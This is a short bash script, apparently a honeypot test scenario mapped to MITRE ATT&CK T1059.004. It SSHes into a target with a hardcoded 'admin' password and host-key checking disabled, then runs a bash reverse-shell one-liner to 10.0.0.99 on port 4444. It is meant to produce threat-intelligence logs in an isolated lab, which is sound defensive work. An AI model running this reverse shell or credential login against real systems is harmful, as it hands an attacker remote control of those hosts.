#!/usr/bin/env bash
# S27 — Bash Reverse Shell Attempt
# Tactic : Execution (TA0002)
# Technique: T1059.004 Command and Scripting Interpreter: Unix Shell
# Note: network is isolated; connection will fail — command logging is the CTI value.
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S27 Bash Reverse Shell Attempt — ${TARGET} ==="
$SSH "timeout 5 bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1' 2>&1 || echo 'connection failed (expected in isolated lab)'" && echo "[OK]" || echo "[FAIL]"
